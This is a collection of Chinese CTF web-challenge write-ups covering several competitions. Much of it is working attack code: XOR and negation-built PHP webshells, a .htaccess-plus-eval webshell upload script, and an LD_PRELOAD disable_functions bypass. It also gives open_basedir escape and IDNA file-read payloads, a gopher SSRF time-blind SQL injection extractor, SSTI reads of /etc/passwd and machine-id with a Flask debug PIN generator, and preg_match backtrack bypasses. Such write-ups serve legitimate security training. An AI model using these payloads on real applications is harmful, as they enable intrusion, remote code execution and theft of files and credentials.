  1. 利用蚁剑插件 `disable_functions` 绕过函数限制，命令行执行/readflag 即可得到flag

  2. 环境变量 `LD_preload + mail`劫持so执行系统命令，用蚁剑连接后，上传`./tools/bypass_disapblefunc_via_PRELOAD/bypass_disablefunc_x64.so`和`./tools/bypass_disapblefunc_via_PRELOAD/bypass_disablefunc_x64.php`

  重新构造payload:`?code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=include(%27/var/tmp/bypass_disablefunc.php%27)&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/var/tmp/bypass_disablefunc_x64.so`

### [SUCTF2019]EasyWeb(open_basedir绕过)

- 题目源码如下
---------------

```php
<?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>
```

1. 第一层绕过(构造无数字字母shell)
------------

   1. 有很瞩目的`get_the_flag()`方法，最后一行是`eval($hhh)`;，题目显然是要让`$hhh`调用`get_the_flag`方法。这题对`$hhh`（即`$_GET['_']`）做了一定的限制：

       - 长度不允许大于18。
       - 不允许出现符合正则表达式的内容。
       - 字符串所用的字符数量不能大于12个。

       显然需要构造无数字字母shell来调用`get_the_flag()`方法。

   2. 这个脚本可以检测出有哪些可用字符
       ```php
       <?php
       for($a = 0; $a < 256; $a++){
           if (!preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', chr($a))){
               echo chr($a)." ";
           }
       }
       ```
       输出
       `! # $ % ( ) * + - / : ; < > ? @ \ ] ^ { }`

   3. 异或构造shell:
       ```php
       <?php
       $l = "";
       $r = "";
       $argv = str_split("_GET");  ##将_GET分割成一个数组，一位存一个值
       for($i=0;$i<count($argv);$i++){   
           for($j=0;$j<255;$j++)
           {
               $k = chr($j)^chr(255);    ##进行异或         
               if($k == $argv[$i]){
                   if($j<16){  ##如果小于16就代表只需一位即可表示，但是url要求是2位所以补个0
                       $l .= "%ff";
                       $r .= "%0" . dechex($j);
                       continue;
                   }
                   $l .= "%ff";
                   $r .= "%" . dechex($j);
                   
               }
           }}
       echo "\{$l`$r\}";  ### 这里的反引号只是用来区分左半边和右半边而已
       ?>
       ```
   4. 构造出如下的payload
       ```php
       ${%A0%B8%BA%AB^%ff%ff%ff%ff}{%A0}();&%A0=phpinfo
       ##  1^2=2^1
       ## 这里值得注意的是${_GET}{%A0}就等于$_GET[%A0],%A0是一个字符虽然没有被引号引起来但是php也不会将他看出是变量，这就是为什么&_GET[cmd]=&_GET["cmd"] 了。
       ## 还有一个特性是$a=phpinfo 如果执行$a() 就相当于执行了phpinfo()
       ```
   5. 通过上一个payload我们看到了回显,那么我们将phpinfo替换为get_the_flag即可调用此函数。
--------

2. 绕过函数中的检测上传文件
--------
   1. 接下来分析get_the_flag()：

       - 限制了上传的文件名。如果出现了“ph”会退出。
       - 限制了上传的文件内容。如果内容出现了“<?”，或经exif_imagetype()检测不是图片，会退出。
    
   2. 检测绕过
       
       1. exif_imagetype()还是比较好绕过的：

          - 可以用`\x00\x00\x8a\x39\x8a\x39`。
          - 也可以用
          ```.htaccess
          #define width 1337
          #define height 1337 
          ```

       2. `<?`被限制，导致大部分一句话木马都被过滤了，而`<script language='php'></script>`又只能在php5环境下使用
       
           所以将一句话进行base64编码，然后在.htaccess中利用php伪协议进行解码
       
       3. 该题环境是Apache+PHP，可以上传.htaccess文件来绕过对文件的检测：

           ```.htaccess
           \x00\x00\x8a\x39\x8a\x39 
           AddType application/x-httpd-php .jpg 
           php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_837ec5754f503cfaaee0929fd48974e7/shaw.jpg" 
           ```

   3. 上传脚本

       ```python
       import requests
       import base64

       htaccess = b"""
       #define width 1337
       #define height 1337 
       AddType application/x-httpd-php .jpg
       php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.jpg"
       """
       shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['cmd']);?>")
       url = "http://dfcea339-b6d8-4b48-99ac-9bfaecda5527.node4.buuoj.cn:81//?_=${%86%86%86%86^%d9%c1%c3%d2}{%86}();&%86=get_the_flag"

       files = {'file':('.htaccess',htaccess,'image/jpeg')}
       data = {"upload":"Submit"}
       response = requests.post(url=url, data=data, files=files)
       print(response.text)

       files = {'file':('shell.jpg',shell,'image/jpeg')}
       response = requests.post(url=url, data=data, files=files)
       print(response.text)
       ```
       脚本会输出两个路径，分别是.htaccess和木马的存放路径我们直接访问木马，在后面加上`?cmd=phpinfo()`
------
3. 绕过open_basedir
   
   *或者用蚁剑连接，使用bypass disable_functions插件*

   [open_basedir绕过](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)

   [PHP绕过open_basedir列目录](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)
-----

1. 在phpinfo页面中会发现存在open_basedir限制了访问路径

    >open_basedir是php.ini中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域

    >假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。

    >注意用open_basedir指定的限制实际上是前缀,而不是目录名。

    >举例来说: 若”open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/user1″都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。

2. payload:

    ```url
    ?cmd=mkdir('rot');chdir('rot');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(glob('*'));
    ```

    ```url
    /upload/tmp_2c67ca1eaeadbdc1868d67003072b481/1.test?cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g'));
    ```

### SUCTF2018 GetShell(汉字取反)

1. 源码

    ```php
    if($contents=file_get_contents($_FILES["file"]["tmp_name"])){
        $data=substr($contents,5);
        foreach ($black_char as $b) {
            if (stripos($data, $b) !== false){
                die("illegal char");
            }
        }     
    } 
    ```
    检查文件内容（内容前五位不检查），内容中有匹配到黑名单的输出illegal char

    文件上传成功后会修改文件后缀为php，那么就需要构造一个webshell成功上传即可

    通过fuzz得知。不能有a-zA-Z0-9?<>^@#!%&*空格

    fuzz脚本

    ```php
    # -*- coding:utf-8 -*-
    # Author: m0c1nu7
    import requests

    def ascii_str():
        str_list=[]
        for i in range(33,127):
            str_list.append(chr(i))
        #print('可显示字符：%s'%str_list)
        return str_list

    def upload_post(url):
        str_list = ascii_str()
        for str in str_list:
            header = {
            'Host':'3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding':'gzip, deflate',
            'Content-Type':'multipart/form-data; boundary=---------------------------339469688437537919752303518127'
            }
            post = '''-----------------------------339469688437537919752303518127
    Content-Disposition: form-data; name="file"; filename="test.txt"
    Content-Type: text/plain

    12345'''+str+'''
    -----------------------------339469688437537919752303518127
    Content-Disposition: form-data; name="submit"

    提交			
    -----------------------------339469688437537919752303518127--'''

            res = requests.post(url,data=post.encode('UTF-8'),headers=header)
            if 'Stored' in res.text:
                print("该字符可以通过:  {0}".format(str))
            else:
                print("过滤字符:  {0}".format(str))
                


    if __name__ == '__main__':
        url = 'http://3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn/index.php?act=upload'
        upload_post(url)
    ```

2. 利用中文getshell

    ```php
    <?=
    $__=[];
    $____=$__==$__;
    #$____=1,利用php弱类型，True==1
    $_=~(北)[$____];$_.=~(熙)[$____];$_.=~(北)[$____];$_.=~(拾)[$____];$_.=~(的)[$____];$_.=~(和)[$____];
    #system
    $___=~(样)[$____];$___.=~(说)[$____];$___.=~(小)[$____];$___.=~(次)[$____];$___.=~(站)[$____];$____=~(瞰)[$____];
    #_POST
    $_($$___[$_]);
    #system($_POST[system]);
    ```

### ISITDTU 2019 EasyPHP(限制字符种数)

#### 源码

    ```php
    <?php
    highlight_file(__FILE__);

    $_ = @$_GET['_'];
    if ( preg_match('/[\x00- 0-9\'"`$&.,|[{_defgops\x7F]+/i', $_) )
        die('rosé will not do it');

    if ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )
        die('you are so close, omg');

    eval($_);
    ```

    >count_chars(string,3) 返回一个去重的字符串(所有使用过的不同的字符)长度

    第一个if传入的参数不能包含正则表达式中的字符，可以用取反，异或绕过(没有过滤 ~ 和 ^ )

    第二个if参数中使用的字符种类数不能超过13

### 解题

1. 收集信息

    首先测试一下phpinfo(),这一步通过取反就可以，字符种类数不会超过13，在phpinfo()中发现命令执行的函数都被禁用了

    要获取flag，可以一同scandir()或glob()函数列目录，但它返回一个数组，我们还需要一个print_r或var_dump

    传入的参数

    ```url
    print_r(scandir('.'));==((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));
    ```
    请求发送后第二个if过不去，所用字符数超过限制，需要缩减字符

2. 构造payload

    这里说明一下，取反是没有办法缩减字符种数，因为一个字符经过两次取反还是原子符，而异或不一样，三个字符异或如果等于第四个字符，那么就可以用这三个字符代替第四个字符，从而删去第四个字符。

    [三重异或构造payload](./xor_3s.py)

## SUCTF2019 Pythonnginx(IDNA编码绕过)

1. 利用点

    - CVE-2019-9636：urlsplit不处理NFKC标准化

    - url中的unicode漏洞引发的域名安全问题

    - nginx 配置文件位置

        ```sh
        配置文件存放目录：/etc/nginx
        主配置文件：/etc/nginx/conf/nginx.conf
        管理脚本：/usr/lib64/systemd/system/nginx.service
        模块：/usr/lisb64/nginx/modules
        应用程序：/usr/sbin/nginx
        程序默认存放位置：/usr/share/nginx/html
        日志默认存放位置：/var/log/nginx
        配置文件目录为：/usr/local/nginx/conf/nginx.conf
        ```

2. 解题过程

    前两个 if 判断 host是否含有 suctf.cc 如果有就报错，经过 utf-8 解码 idna 编码 之后传入到 urlunsplit函数 组合成url ，再用 if 和suctf.cc进行一次比较 如果相同 就 进行读取。

    **方法一**

    - idna与utf-8编码漏洞

        idn 国际化域名应用，国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以ASCII字符串存储。

        什么是idna?
        A library to support the Internationalised Domain Names in Applications (IDNA) protocol as specified in RFC 5891. This version of the protocol is often referred to as “IDNA2008” and can produce different results from the earlier standard from 2003.

        ℆这个字符,如果使用python3进行idna编码的话

        `print(‘℆’.encode(‘idna’))`

        结果:`b’c/u’`
        如果再使用utf-8进行解码的话

        `print(b’c/u’.decode(‘utf-8’))`

        结果:`c/u`

        通过这种方法可以绕过本题

    - *爆破脚本*

        ```python
            from urllib.parse import urlparse,urlunsplit,urlsplit
            from urllib import parse

            def get_unicode():
                for x in range(65536):
                    uni=chr(x)
                    url="http://suctf.c{}".format(uni)
                    try:
                        if getUrl(url):
                            print("str: "+uni+' unicode: \\u'+str(hex(x))[2:])
                    except:
                        pass

            # 使用题目源码逻辑判断
            def getUrl(url):
                url = url
                host = parse.urlparse(url).hostname
                if host == 'suctf.cc':
                    return False
                parts = list(urlsplit(url))
                host = parts[1]
                if host == 'suctf.cc':
                    return False
                newhost = []
                for h in host.split('.'):
                    newhost.append(h.encode('idna').decode('utf-8'))
                parts[1] = '.'.join(newhost)
                finalUrl = urlunsplit(parts).split(' ')[0]
                host = parse.urlparse(finalUrl).hostname
                if host == 'suctf.cc':
                    return True
                else:
                    return False

            if __name__=="__main__":
                get_unicode()
        ```

        ```python
            # 输出结果
            str: ℂ unicode: \u2102
            str: ℭ unicode: \u212d
            str: Ⅽ unicode: \u216d
            str: ⅽ unicode: \u217d
            str: Ⓒ unicode: \u24b8
            str: ⓒ unicode: \u24d2
            str: Ｃ unicode: \uff23
            str: ｃ unicode: \uff43
        ```
        
        从结果中随便选一个就可以绕过。

        payload：`file://suctf.cℂ/../../../../..//usr/local/nginx/conf/nginx.conf`

        **方法二**

        利用urlsplit不处理NFKC标准化

        payload: `file:////suctf.cc/usr/local/nginx/conf/nginx.conf`

        *注意*

        如果上面的payload不能用，可以在`suctf.cc`后加`../../../../../`尝试，多了没问题，少了不行。

## 攻防世界 very_easy_sql(gopher+sqli)

1. gopher 协议

   1. 什么是gopher协议

        Gopher协议是一种早期的互联网协议，用于在网络上获取文本信息。它于1991年提出，旨在提供一种简单、高效的方式来浏览和访问文件。

        Gopher协议使用类似于文件系统的层次结构来组织数据，其中每个项目都有一个唯一的标识符。通过Gopher客户端软件，用户可以浏览目录并选择下载或查看文件。Gopher服务器可以提供文本文件、图像文件、二进制文件等。

        与HTTP相比，Gopher协议具有更简单的设计和较少的功能。它基于传输控制协议（TCP）进行通信，默认端口号为70。然而，随着万维网的崛起和HTTP的普及，Gopher协议逐渐被取代。

    2. 利用

        利用gopher协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp 等，也可以发送 GET、POST 请求，这可以拓宽 SSRF 的攻击面

    3. 语法

        gopher协议的格式通常为：

        ```html
        gopher://hostname:port/请求方法(get、post等)/path
        ```

        其中，hostname 表示 Gopher 服务器的主机名或 IP 地址，port 表示 Gopher 服务器监听的端口号（默认为 70），而 path 则是资源的路径。

    4. 举个例子

        要请求 Gopher 服务器上的 /example/file.txt 文本文件，可以使用以下 URL 格式：

        ```html
        gopher://example.com:端口/example/file.txt
        ```

        在本地主机的80端口上使用Gopher协议的GET方法访问一个资源：

        ```html
        gopher://127.0.0.1:80/_GET /index.php HTTP/1.1
        ```

        /_GET /index.php HTTP/1.1 表示使用 GET 方法请求位于 /index.php 的资源，并且使用 HTTP 1.1 协议版本

    5. gopher协议构造脚本

        ```python
        import urllib.parse

        host = "127.0.0.1:80"
        content = "uname=admin&passwd=admin"
        content_length = len(content)

        test =\
        """POST /index.php HTTP/1.1
        Host: {}
        User-Agent: curl/7.43.0
        Accept: */*
        Content-Type: application/x-www-form-urlencoded
        Content-Length: {}

        {}
        """.format(host,content_length,content)

        tmp = urllib.parse.quote(test) 
        new = tmp.replace("%0A","%0D%0A")
        result = urllib.parse.quote(new) 
        print("gopher://"+host+"/_"+result)
        ```

2. sql时间盲注

    *注：* 这里也可以用**报错注入**

    ```python
    import urllib.parse
    import requests
    import time
    import base64
    url="http://61.147.171.105:57239//use.php?url="
    flag=""
    for pos in range(1,50):
        for i in range(33,127):
            #poc="') union select 1,2,if(1=1,sleep(5),1) # "

            ## 爆库
            # poc="') union select 1,2,if(ascii( substr((database()),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "

            ## 爆表
            # poc="') union select 1,2,if(ascii( substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "

            ## 爆列
            poc="') union select 1,2,if(ascii( substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "
            
            # flag
            # poc="') union select 1,2,if(ascii( substr((select * from flag),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "
            
            bs = str(base64.b64encode(poc.encode("utf-8")), "utf-8")
            final_poc="gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D"+bs+"%3B%250d%250a"
            t1=time.time()
            res=requests.get(url+final_poc)
            t2=time.time()
            if(t2-t1>2):
                flag+=chr(i)
                print(flag)
                break
    print(flag)
    ```

## GYCTF2020 FlaskAPP(Flask 获取debug模式PIN码)

[Flask debug模式下的 PIN 码安全性](https://xz.aliyun.com/t/8092?time__1311=n4%2BxuDgDBADQYiKP40HwbDyiGDkDciiGmpcpoD&alichlgref=https%3A%2F%2Flink.csdn.net%2F%3Ftarget%3Dhttps%253A%252F%252Fxz.aliyun.com%252Ft%252F8092)

1. 题目类型判断 ---> [SSIT](#gyctf2020-flaskapp)
   
   这里主要写一下Flask Debug模式利用PIN码获取shell执行权

2. PIN码获取
   
   PIN 主要由 probably_public_bits 和 private_bits 两个列表变量决定，而这两个列表变量又由如下6个变量决定：

   ```python
   username 启动这个 Flask 的用户
   modname 一般默认 flask.app
   getattr(app, '__name__', getattr(app.__class__, '__name__')) 一般默认 flask.app 为 Flask
   getattr(mod, '__file__', None)为 flask 目录下的一个 app.py 的绝对路径,可在爆错页面看到
   str(uuid.getnode()) 则是网卡 MAC 地址的十进制表达式
   get_machine_id() 系统 id
   ```
   
   `modname` 一般默认 `flask.app`，`getattr(app, '__name__', getattr(app.__class__, '__name__'))`一般默认 flask.app 为 Flask，所以主要获取剩下的4个变量即可。
   
   本题中，首先通过报错就可以得知很多信息，Python3的环境以及
   
   ```python
   modname：flask.app
   getattr(app, '__name__', getattr(app.__class__, '__name__'))：Flask
   getattr(mod, '__file__', None)：/usr/local/lib/python3.7/site-packages/flask/app.py
   # 注意python2中为app.pyc
   ```

   接下来可以通过SSTI去文件读取其他信息，使用jinja2的控制结构语法构造。

   username：`{{x.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}`

   MAC地址(要转化为十进制)：`{{x.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address').read() }}`

   系统id：`{{x.__init__.__globals__['__builtins__'].open('/etc/machine-id').read() }}`

   生成PIN的脚本：

   ```python
    import hashlib
    from itertools import chain
    probably_public_bits = [
        'flaskweb'# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
    ]

    private_bits = [
        '231530469832647',# str(uuid.getnode()),  /sys/class/net/eth0/address
        '1408f836b0ca514d796cbf8960e45fa1'# get_machine_id(), /etc/machine-id
    ]

    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    print(rv)
   ```

   得到PIN码后，利用python执行系统命令`os.popen('系统命令').read()`获取flag，如：`os.popen('cat /this_is_the_flag.txt').read()`

## preg_match 正则匹配 绕过
### FBCTF2019 RCEService(RCE)

   **PHP利用PCRE回溯次数限制绕过某些安全限制，多行绕过preg_match函数**

   源码(buuoj中没有提供，原竞赛提供了源码)

   ```php
   <?php
   putenv('PATH=/home/rceservice/jail');

   if (isset($_REQUEST['cmd'])) {
   $json = $_REQUEST['cmd'];

   if (!is_string($json)) {
      echo 'Hacking attempt detected<br/><br/>';
   } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
      echo 'Hacking attempt detected<br/><br/>';
   } else {
      echo 'Attempting to run command:<br/>';
      $cmd = json_decode($json, true)['cmd'];
      if ($cmd !== NULL) {
         system($cmd);
      } else {
         echo 'Invalid input';
      }
      echo '<br/><br/>';
   }
   }
   ?>
   ```

   除了`ls`其他函数都被禁了

- 解法一

   **因为`preg_match`只能匹配第一行，所以这里可以采用多行绕过。此方法针对`preg_match`函数。**

   题目中存在`\x00-\x7f`,会匹配掉一个`%0a`，在payload前后加几个%0a就行了。这种主要针对`%0a`在`{}`外侧。

   因为`putenv('PATH=/home/rceservice/jail');`修改了环境变量，所以只能使用绝对路径使用cat命令，cat命令在`/bin`文件夹下

   Linux命令的位置：`/bin`,`/usr/bin`，默认都是全体用户使用，`/sbin`,`/usr/sbin`,默认root用户使用

   我们使用payload `{%0A"cmd":"ls /home/rceservice/jail"%0A}` （%A是换行）得到回显 ls 一个文件，这也再一次说明当前环境下有 ls命令 没有其它命令。

   使用payload `{%0A"cmd":"ls /home/rceservice"%0A}` 得到回显，flag jail 。也就是说 flag 在flag里。

   使用`{%0A"cmd":"/bin/cat /home/rceservice/flag"%0A}` 得到flag。


   ```url
   ?cmd={%0A"cmd":"ls /home/rceservice"%0A}
   or
   ?cmd=%0A%0A{"cmd":"ls /home/rceservice"}%0A%0A
   ```

- 解法二

   **利用PCRE回溯来绕过 preg_match，这种方法主要针对正则表达式**

   [PCRE回溯](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

   1. 由上面的方法知道了，想要得到flag要访问/bin/cat /home/rceservice/flag 。
   2. 根据PCRE回溯的方法解题，需要用POST发送请求，因为GET会因为头太大报错。

   ```html
   414 Request-URI Too Large
   ```

   3. 所以我们使用的脚本如下：

   ```python
   import requests

   payload = '{"cmd":"/bin/cat /home/rceservice/flag ","nayi":"' + "a"*(1000000) + '"}' ##超过一百万，这里写一千万不会出结果。

   res = requests.post("http://b27f0703-fe79-470f-b1fb-f7cfbd8c966b.node3.buuoj.cn/", data={"cmd":payload})
   print(res.text)
   ```

   即可得到flag

### MRCTF2020套娃

- 利用点
    
    正则匹配一般情况下不会匹配换行符(url编码: %0a),因此加了换行符的字符串和没加换行符的字符串在正则看来是一样的

    如果想匹配换行符可以在正则表达式尾部加上`/s`,这里的 s 标记告诉正则表达式引擎将 `.` 包括换行符在内一并匹配。`.`表示匹配任意字符。

1. F12 网页源码

    ```php
    // $_SERVER['QUERY_STRING']：指的是查询的字符串，即地址栏?之后的部分
    $query = $_SERVER['QUERY_STRING'];

    // 这个if判断就是要求查询字符串中不能包含 "_", %5f就是 "_" 的url编码
    if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
        die('Y0u are So cutE!');
    }

    // 这个if判断要求b_u_p_t 不能为23333，而正则有要求是23333
    if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
        echo "you are going to the next ~";
    }
    ```

   1. 第一个if的绕过(两种方法)--php非法传参

        - PHP会将传参中的空格( )、小数点(.)自动替换成下划线
        - 这道题目也可以用 %5F绕过，正则匹配只匹配了小写

    2. 第二个if的绕过--preg_match 正则匹配绕过

        这里利用了`perg_match`只能匹配单行字符，会将换行符后的字符串忽略。`preg_match`没启动`/s`模式（单行匹配模式）时，正则表达式是无法匹配换行符(%0a,\n)的,且会自动忽略末尾的换行符。

        所以可以在23333后面加上换行符的url编码`%0a`就可以绕过。

2. 进入下一个页面后，F12源码发现一段只有`+()[]!`组成的编码，即jsfuck编码，可以在浏览器控制台输入运行一下，提示POST传参`Merak`

    源码

    ```php
    <?php 
    error_reporting(0); 
    include 'takeip.php';
    ini_set('open_basedir','.'); 
    include 'flag.php';

    if(isset($_POST['Merak'])){ 
        highlight_file(__FILE__); 
        die(); 
    } 


    function change($v){ 
        $v = base64_decode($v); 
        $re = ''; 
        for($i=0;$i<strlen($v);$i++){ 
            $re .= chr ( ord ($v[$i]) + $i*2 ); 
        } 
        return $re; 
    }
    echo 'Local access only!'."<br/>";
    $ip = getIp();
    if($ip!='127.0.0.1')
    echo "Sorry,you don't have permission!  Your ip is :".$ip;
    if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
    echo "Your REQUEST is:".change($_GET['file']);
    echo file_get_contents(change($_GET['file'])); }
    ?> 
    ```

    这段代码的作用就是，用change函数处理一下传入的`file`参数，我们主要用这个参数读取flag。可以将change方法逆一下。

    还有一个ip判断，(这里就是请求头IP伪造,两种方法,本题要用第二种)

    ```html
    X-Forwarded-For:127.0.0.1
    <!-- 或 -->
    Client-IP:127.0.0.1
    ```

    至于`file_get_contents($_GET['2333']) === 'todat is a happy day'`,伪协议php://或者data://传入即可。

### Zer0pts2020 Can you guess it?(正则匹配绕过+PHP特性)

- 利用点

    正则匹配时，会识别到空字符串(*这里的空字符指的是超过ascii码范围的字符，而非不可打印字符*)，因此可以通过添加空字符的方式绕过题目中对原字符的检查

- 源码

    ```php
    <?php
    include 'config.php'; // FLAG is defined in config.php
    if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
    exit("I don't know what you are thinking, but I won't let you read it :)");
    }
    if (isset($_GET['source'])) {
    highlight_file(basename($_SERVER['PHP_SELF']));
    exit();
    }

    $secret = bin2hex(random_bytes(64));
    if (isset($_POST['guess'])) {
    $guess = (string) $_POST['guess'];
    if (hash_equals($secret, $guess)) {
        $message = 'Congratulations! The flag is: ' . FLAG;
    } else {
        $message = 'Wrong.';
    }
    }
    ?>
    ```

- 漏洞利用点查找

    注释指明flag在config.php中，但是如果按照绕过hash_equals的思路来是行不通的，该函数并没有漏洞也没有使用错误。

    所以这道题目的利用点就只剩下显示源码的逻辑部分了，采用`basename`函数截取`$_SERVER['PHP_SELF']`

    记录一下`$_SERVER['PHP_SELF']`、`$_SERVER['SCRIPT_NAME']` 与 `$_SERVER['REQUEST_URI']`的差别：

    ```php
    //网址：https://www.shawroot.cc/php/index.php/test/foo?username=root

    $_SERVER[‘PHP_SELF’] 得到：/php/index.php/test/foo
    $_SERVER[‘SCRIPT_NAME’] 得到：/php/index.php
    $_SERVER[‘REQUEST_URI’] 得到：/php/index.php/test/foo?username=root
    ```

    $_SERVER['PHP_SELF']会获取我们当前的访问路径，并且PHP在根据URI解析到对应文件后会忽略掉URL中多余的部分，即若访问存在的index.php页面，如下两种UR均会访问到。

    ```url
    /index.php
    /index.php/dosent_exist.php
    ```

    basename可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录，即：

    ```php
    $var1="/config.php/test"
    basename($var1)	=> test
    $var2="/config.php/%ff"
    basename($var2)	=>	config.php
    ```

    要想“highlight_file”这个`config.php`，必须要让`basename($_SERVER['PHP_SELF'])==config.php`。所以此题构造`/index.php/config.php?source`，这样的话，`$_SERVER['PHP_SELF']`就会等于`/index.php/config.php`，经过`basename()`函数后就变成了`config.php`，这里成功绕过。

    ```php
    preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF']
    ```

    结尾\/*$的意思是出现0或多个“/”然后结束字符串，所以此正则本意是不允许config.php作为$_SERVER[‘PHP_SELF’]的结尾，但我们可以利用空字符串绕过正则：basename()会去掉不可见字符，使用超过ascii码范围的字符就可以绕过

    ```url
    /index.php/config.php/%ff?source
    ```

## WUSTCTF2020 颜值成绩查询(bool盲注)

1. 输入1-4都有结果，输入1+1还有结果，可以断定注入点就在输入框。
2. 也测试了SSTI，发现没有反应，可以排除
3. 题目也提示了查询，所以大概率是sqli。
4. 确定了是bool盲注，判断注入类型
   
   加`'#`,报错,说明不是字符型注入那么就是整型注入

5. 输入`0^1`发现也返回了结果，可以采用异或求解，`if`也可以，没有测试
   
   看网上的wp这道题还过滤了空格,构造payload时要注意

6. 爆破脚本
   
   [sqli_blind.py](./sqli_blind.py)

## 红明谷CTF 2021 webshell(php系统命令执行)

1. 源码

    ```php
    <?php
    error_reporting(0);
    highlight_file(__FILE__);
    function check($input){
        if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
            // if(preg_match("/'| |_|=|php/",$input)){
            die('hacker!!!');
        }else{
            return $input;
        }
    }

    function waf($input){
    if(is_array($input)){
        foreach($input as $key=>$output){
            $input[$key] = waf($output);
        }
    }else{
        $input = check($input);
    }
    }

    $dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
    if(!file_exists($dir)){
        mkdir($dir);
    }
    switch($_GET["action"] ?? "") {
        case 'pwd':
            echo $dir;
            break;
        case 'upload':
            $data = $_GET["data"] ?? "";
            waf($data);
            file_put_contents("$dir" . "index.php", $data);
    }
    ?>
    ```

    重点是这句代码,会将参数中的内容写入文件

    ```php
    file_put_contents("$dir" . "index.php", $data);
    ```

